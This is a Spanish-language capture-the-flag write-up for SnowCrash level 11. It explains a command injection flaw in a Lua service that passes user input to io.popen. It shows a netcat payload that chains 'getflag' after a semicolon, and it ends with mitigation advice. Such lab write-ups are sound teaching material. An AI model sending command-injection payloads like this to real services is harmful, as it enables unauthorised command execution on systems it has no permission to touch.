# 🚩 SnowCrash Level 11: Inyección de Comandos en Lua

Este nivel presenta una vulnerabilidad de **Inyección de Comandos OS** a través de un servicio que corre en el puerto `5151`. El script de Lua utiliza una función insegura para procesar la entrada del usuario.

## 🔍 Análisis del Código (`level11.lua`)

Al examinar el código fuente del script, identificamos la función `hash()` como el punto de entrada vulnerable:

```lua
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()
  ...
end
```

### El Fallo de Seguridad
1.  **Función `io.popen`**: Esta función ejecuta una cadena de texto directamente en el shell del sistema operativo.
2.  **Concatenación Insegura**: La variable `pass` (proporcionada por el usuario vía socket) se concatena directamente con el comando `echo` usando los operadores `..`.
3.  **Falta de Sanitización**: No existe ningún filtro que impida el uso de metacaracteres del shell (como `;`, `|`, `&`, o `` ` ``).

---

## 🛠️ Metodología de Explotación

Dado que el servidor ya está en ejecución y escuchando en el puerto `5151`, podemos interactuar con él usando `netcat` e inyectar nuestro propio comando.

### El Payload
Si enviamos `; getflag > /tmp/jeje`, el comando final ejecutado por el sistema será:
`echo ; getflag > /tmp/jeje | sha1sum`

1.  **Paso 1: Inyectar el comando**
    Conéctate al servicio local y envía el payload cuando solicite el "Password":
    ```bash
    echo "loquesea; getflag > /tmp/jeje" | nc 127.0.0.1 5151
    ```

2.  **Paso 2: Recuperar la Flag**
    Como el script de Lua corre con los privilegios de `flag11`, el comando `getflag` se habrá ejecutado correctamente guardando el token en el archivo temporal:
    ```bash
    cat /tmp/jeje
    ```

---

## 🛡️ Prevención y Mitigación

*   **Evitar `io.popen` con entrada de usuario**: Si es posible, utiliza librerías nativas de Lua para realizar tareas (como hashing) en lugar de llamar a comandos externos del sistema.
*   **Sanitización de entradas**: Si es estrictamente necesario usar el shell, se deben filtrar o escapar todos los metacaracteres que permitan encadenar comandos.
*   **Uso de argumentos**: En lenguajes que lo permitan, pasar los argumentos como una lista separada en lugar de una sola cadena de texto para evitar que el shell los interprete como código.

